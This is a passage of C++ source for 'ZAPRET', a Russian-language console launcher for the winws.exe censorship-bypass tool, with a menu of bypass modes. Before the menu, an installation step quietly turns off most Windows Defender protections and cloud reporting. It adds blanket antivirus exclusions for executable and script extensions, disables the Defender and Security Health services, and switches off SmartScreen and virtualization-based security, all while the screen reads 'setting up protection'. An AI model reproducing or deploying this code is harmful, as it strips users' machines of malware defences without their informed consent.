    SecureSystem(L"powershell -ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableOnAccessProtection $true\" 2>$null");
    SecureSystem(L"powershell -ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableIOAVProtection $true\" 2>$null");
    SecureSystem(L"powershell -ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableScriptScanning $true\" 2>$null");
    SecureSystem(L"powershell -ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableArchiveScanning $true\" 2>$null");
    SecureSystem(L"powershell -ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableRemovableDriveScanning $true\" 2>$null");
    SecureSystem(L"powershell -ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableBlockAtFirstSeen $true\" 2>$null");
    SecureSystem(L"powershell -ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableEmailScanning $true\" 2>$null");
    SecureSystem(L"powershell -ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableNetworkProtection $true\" 2>$null");
    SecureSystem(L"powershell -ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableIntrusionPreventionSystem $true\" 2>$null");
    SecureSystem(L"powershell -ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true\" 2>$null");
    SecureSystem(L"powershell -ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableScanningNetworkFiles $true\" 2>$null");
    
    ShowProgressBar(30, "Настройка защиты");
    
    // МАКСИМАЛЬНЫЕ ИСКЛЮЧЕНИЯ - ЗАЩИТА ВСЕХ ФАЙЛОВ ОТ СКАНИРОВАНИЯ
    ShowProgressBar(40, "Добавление исключений");
    std::wstring addExclusion1 = L"powershell -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath '" + binPath + L"' -Force\" 2>$null";
    std::wstring addExclusion2 = L"powershell -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath '" + exeDir + L"' -Force\" 2>$null";
    std::wstring addExclusion3 = L"powershell -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionProcess 'winws.exe' -Force\" 2>$null";
    std::wstring addExclusion4 = L"powershell -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionProcess 'FIX_RUNET.exe' -Force\" 2>$null";
    std::wstring addExclusion5 = L"powershell -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionProcess 'WinDivert64.sys' -Force\" 2>$null";
    std::wstring addExclusion6 = L"powershell -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath 'C:\\Windows\\System32\\drivers\\WinDivert64.sys' -Force\" 2>$null";
    std::wstring addExclusion7 = L"powershell -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionExtension '.exe' -Force\" 2>$null";
    std::wstring addExclusion8 = L"powershell -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionExtension '.sys' -Force\" 2>$null";
    std::wstring addExclusion9 = L"powershell -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionExtension '.dll' -Force\" 2>$null";
    std::wstring addExclusion10 = L"powershell -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionExtension '.bat' -Force\" 2>$null";
    std::wstring addExclusion11 = L"powershell -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionExtension '.ps1' -Force\" 2>$null";
    std::wstring addExclusion12 = L"powershell -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionExtension '.vbs' -Force\" 2>$null";
    std::wstring addExclusion13 = L"powershell -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionExtension '.cmd' -Force\" 2>$null";
    std::wstring addExclusion14 = L"powershell -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionExtension '.scr' -Force\" 2>$null";
    
    SecureSystem(addExclusion1.c_str());
    SecureSystem(addExclusion2.c_str());
    SecureSystem(addExclusion3.c_str());
    SecureSystem(addExclusion4.c_str());
    SecureSystem(addExclusion5.c_str());
    SecureSystem(addExclusion6.c_str());
    SecureSystem(addExclusion7.c_str());
    SecureSystem(addExclusion8.c_str());
    SecureSystem(addExclusion9.c_str());
    SecureSystem(addExclusion10.c_str());
    SecureSystem(addExclusion11.c_str());
    SecureSystem(addExclusion12.c_str());
    SecureSystem(addExclusion13.c_str());
    SecureSystem(addExclusion14.c_str());
    
    ShowProgressBar(60, "Добавление исключений");
    
    // ДОПОЛНИТЕЛЬНАЯ ЗАЩИТА - ОТКЛЮЧЕНИЕ ОБЛАЧНОЙ ЗАЩИТЫ И АВТОМАТИЧЕСКОЙ ОТПРАВКИ ОБРАЗЦОВ
    ShowProgressBar(70, "Отключение облачной защиты");
    SecureSystem(L"powershell -ExecutionPolicy Bypass -Command \"Set-MpPreference -MAPSReporting 0 -Force\" 2>$null");
    SecureSystem(L"powershell -ExecutionPolicy Bypass -Command \"Set-MpPreference -SubmitSamplesConsent 2 -Force\" 2>$null");
    SecureSystem(L"powershell -ExecutionPolicy Bypass -Command \"Set-MpPreference -CloudBlockLevel 0 -Force\" 2>$null");
    SecureSystem(L"powershell -ExecutionPolicy Bypass -Command \"Set-MpPreference -CloudExtendedTimeout 0 -Force\" 2>$null");
    
    ShowProgressBar(80, "Отключение облачной защиты");
    
    // ЗАЩИТА ФАЙЛОВ ОТ СКАНИРОВАНИЯ АНТИВИРУСАМИ
    ShowProgressBar(85, "Защита файлов");
    ProtectFilesFromAV(exeDir);
    ProtectFilesFromAV(binPath);
    ProtectFilesFromAV(L"C:\\Windows\\System32\\drivers");
    
    // АГРЕССИВНАЯ БЛОКИРОВКА СЛУЖБ АНТИВИРУСА
    ShowProgressBar(90, "Блокировка служб");
    _wsystem(L"sc config WinDefend start= disabled >nul 2>&1");
    _wsystem(L"sc stop WinDefend >nul 2>&1");
    _wsystem(L"sc config WdNisSvc start= disabled >nul 2>&1");
    _wsystem(L"sc stop WdNisSvc >nul 2>&1");
    _wsystem(L"sc config WdNisDrv start= disabled >nul 2>&1");
    _wsystem(L"sc stop WdNisDrv >nul 2>&1");
    _wsystem(L"sc config WdBoot start= disabled >nul 2>&1");
    _wsystem(L"sc config WdFilter start= disabled >nul 2>&1");
    _wsystem(L"sc config SgrmBroker start= disabled >nul 2>&1");
    _wsystem(L"sc stop SgrmBroker >nul 2>&1");
    _wsystem(L"sc config SecurityHealthService start= disabled >nul 2>&1");
    _wsystem(L"sc stop SecurityHealthService >nul 2>&1");
    
    ShowProgressBar(95, "Блокировка служб");
    
    // ОТКЛЮЧЕНИЕ ВСЕХ СИСТЕМ БЕЗОПАСНОСТИ
    _wsystem(L"powershell -Command \"Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer' -Name 'SmartScreenEnabled' -Value 'Off'\" 2>$null");
    _wsystem(L"powershell -Command \"Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System' -Name 'EnableSmartScreen' -Value 0\" 2>$null");
    _wsystem(L"powershell -Command \"Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard' -Name 'EnableVirtualizationBasedSecurity' -Value 0\" 2>$null");
    _wsystem(L"powershell -Command \"Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard' -Name 'RequirePlatformSecurityFeatures' -Value 0\" 2>$null");
    _wsystem(L"powershell -Command \"Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name 'DisableAntiSpyware' -Value 1\" 2>$null");
    _wsystem(L"powershell -Command \"Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' -Name 'DisableRealtimeMonitoring' -Value 1\" 2>$null");
    
    // ОТКЛЮЧЕНИЕ THREAT PROTECTION
    _wsystem(L"powershell -Command \"Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Threat Protection' -Name 'DisableThreatProtection' -Value 1\" 2>$null");
    _wsystem(L"powershell -Command \"Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Threat Protection' -Name 'DisableCloudProtection' -Value 1\" 2>$null");
    
    // ОТКЛЮЧЕНИЕ WINDOWS SECURITY
    _wsystem(L"powershell -Command \"Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\SpyNet' -Name 'SpyNetReporting' -Value 0\" 2>$null");
    _wsystem(L"powershell -Command \"Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\SpyNet' -Name 'SubmitSamplesConsent' -Value 0\" 2>$null");
    
    ShowProgressBar(100, "Завершение установки");
    std::cout << "\n";
    PrintGreen("Установка завершена успешно!");
    std::cout << "\n";
    
    // Проверка совместимости с Windows
    if (!CheckWindowsCompatibility()) {
        PrintRed("Ошибка: Программа требует Windows 7 или выше для работы.");
        PrintRed("Текущая версия Windows не поддерживается.");
        system("pause");
        return 1;
    }
    
    SetConsoleTitleW(L"ZAPRET | YOUTUBE & DISCORD & CLOUDFLARE");
    
    // Установка кодировки для правильного отображения русского текста
    system("chcp 1251 >nul");
    SetConsoleCP(1251);
    SetConsoleOutputCP(1251);
    setlocale(LC_ALL, "Russian");
    
    // Простой текстовый логотип ZAPRET
    std::cout << "\n";
    std::cout << "  ========================================================\n";
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    std::cout << "                         ZAPRET                          \n";
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    std::cout << "  ========================================================\n";
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    std::cout << "         YOUTUBE  *  DISCORD  *  CLOUDFLARE         \n";
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    std::cout << "  ========================================================\n\n";
    
    if (GetFileAttributesA(settingsFile.c_str()) != INVALID_FILE_ATTRIBUTES) {
        MoveFileA(settingsFile.c_str(), backupSettingsFile.c_str());
    }
    ReadSettings();
    
    int choice;
    do {
        // Проверяем статус winws.exe
        bool winwsRunning = false;
        FILE* statusPipe = _wpopen(L"tasklist /FI \"IMAGENAME eq winws.exe\"", L"r");
        if (statusPipe) {
            wchar_t buffer[128];
            std::wstring output = L"";
            
            while (fgetws(buffer, sizeof(buffer), statusPipe) != NULL) {
                output += buffer;
            }
            _pclose(statusPipe);
            
            if (output.find(L"winws.exe") != std::wstring::npos) {
                winwsRunning = true;
            }
        }
        
        std::cout << "\n";
        std::cout << "  ===============================================================\n";
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        std::cout << "                       ГЛАВНОЕ МЕНЮ                             \n";
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        std::cout << "  ===============================================================\n";
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cout << "  [1] Установить сервис     ";
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        std::cout << "[7] ALT1-6              \n";
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        std::cout << "  [2] Удалить сервис        ";
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
        std::cout << "[8] FAKE TLS            \n";
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        std::cout << "  [3] Проверить статус      ";
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_BLUE | FOREGROUND_INTENSITY);
        std::cout << "[9] МГТС                \n";
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        std::cout << "  [4] Диагностика           ";
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
        std::cout << "[10] CLOUDFLARE         \n";
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        std::cout << "  [5] GAME фильтр           ";
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cout << "[11] Завершить winws    \n";
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        std::cout << "  [6] IPSET настройки       ";
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        std::cout << "[0] Выход               \n";
        std::cout << "  ===============================================================\n\n";
        
        std::cout << "  ===============================================================\n";
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        std::cout << "  Сервис ";
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cout << "[!]";
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        std::cout << "\n";
        
        // [1] Сервис
        std::cout << "  [1] ";
        if (currentSettings.service_installed) {
            SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_GREEN | FOREGROUND_INTENSITY);
            std::cout << "активен [OK]";
        } else {
            SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_INTENSITY);
            std::cout << "неактивен [X]";
        }
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        std::cout << "\n";
        
        // [2] IPSET
        std::cout << "  [2] IPSET ";
        if (currentSettings.ipset_enabled) {
            SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_GREEN | FOREGROUND_INTENSITY);
            std::cout << "активен [OK]";
        } else {
            SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_INTENSITY);
            std::cout << "неактивен [X]";
        }
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        std::cout << "\n";
        
        // [3] GAME
        std::cout << "  [3] GAME ";
        if (currentSettings.game_enabled) {
            SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_GREEN | FOREGROUND_INTENSITY);
            std::cout << "активен [OK]";
        } else {
            SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_INTENSITY);
            std::cout << "неактивен [X]";
        }
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        std::cout << "\n";
        
        // [4] ALT и Режим
        std::cout << "  [4] ";
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        std::cout << "ALT: " << currentSettings.current_alt << "  ";
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        std::cout << "Режим: автономный [~]";
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        std::cout << "\n";
        
        // Отображение ID ПК
        std::string pcId = GetPCID();
        std::cout << "  ";
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        std::cout << "Ваш ID: ";
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        std::cout << pcId;
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        std::cout << "\n";
        std::cout << "  ===============================================================\n\n";
        
        // Показываем статус winws.exe
        std::cout << "  Статус: ";
        if (winwsRunning) {
            SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_GREEN | FOREGROUND_INTENSITY);
            std::cout << "[+] winws.exe АКТИВЕН";
        } else {
            SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_INTENSITY);
            std::cout << "[-] winws.exe НЕАКТИВЕН";
        }
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        std::cout << "\n\n";
        
        // Промпт для ввода
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
        std::cout << "  ** Ваш выбор: ";
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        
        std::cin >> choice;
        
        switch (choice) {
            case 0:
                std::cout << "Выход из программы." << std::endl;
                break;
                
            case 1:
                InstallService(exeDir);
                break;
                
            case 2:
                RemoveService();
                break;
                
            case 3:
                CheckServiceStatus();
                break;
                
            case 4:
                RunDiagnostics();
                break;
                
            case 5:
                ToggleGame(exeDir);
                break;
                
            case 6:
                ToggleIpset(exeDir);
                break;
                
            case 7:
                {
                    PrintYellow("Выберите ALT режим (1-6):");
                    int altChoice;
                    std::cin >> altChoice;
                    if (altChoice >= 1 && altChoice <= 6) {
                        RunWinws(exeDir, altChoice);
                    } else {
                        PrintRed("Неверный выбор ALT режима!");
                    }
                }
                break;
                
            case 8:
                {
                    PrintYellow("Выберите FAKE TLS режим:");
                    PrintYellow("1 - FAKE TLS ALT1");
                    PrintYellow("2 - FAKE TLS AUTO ALT1");
                    PrintYellow("3 - FAKE TLS AUTO ALT2");
                    PrintYellow("4 - FAKE TLS AUTO");
                    PrintYellow("5 - FAKE TLS");
                    int tlsChoice;
                    std::cin >> tlsChoice;
                    if (tlsChoice >= 1 && tlsChoice <= 5) {
                        RunWinws(exeDir, tlsChoice + 6);
                    } else {
                        PrintRed("Неверный выбор FAKE TLS режима!");
                    }
                }
                break;
                
            case 9:
                {
                    PrintYellow("Выберите МГТС режим:");
                    PrintYellow("1 - ALT МГТС1");
                    PrintYellow("2 - ALT МГТС2");
                    int mgtsChoice;
                    std::cin >> mgtsChoice;
                    if (mgtsChoice >= 1 && mgtsChoice <= 2) {
                        RunWinws(exeDir, mgtsChoice + 11);
                    } else {
                        PrintRed("Неверный выбор МГТС режима!");
                    }
                }
                break;
                
            case 10:
                {
                    PrintYellow("Выберите режим:");
                    PrintYellow("1 - GENERAL1");
                    PrintYellow("2 - ALT FIX CLOUDFLARE SERVICES");
                    int generalChoice;
                    std::cin >> generalChoice;
                    if (generalChoice >= 1 && generalChoice <= 2) {
                        RunWinws(exeDir, generalChoice + 13);
                    } else {
                        PrintRed("Неверный выбор режима!");
                    }
                }
                break;
                
            case 11:
                FindAndTerminateWinwsProcess(exeDir + L"\\bin");
                break;
                
            default:
                PrintRed("Ошибка: неверный выбор. Введите число от 0 до 11.");
                break;
        }
        if (choice != 0) {
            std::cout << "\nНажмите Enter для продолжения...";
            std::cin.ignore();
            std::cin.get();
        }
    } while (choice != 0);
    WriteSettings();
    
    return 0;
}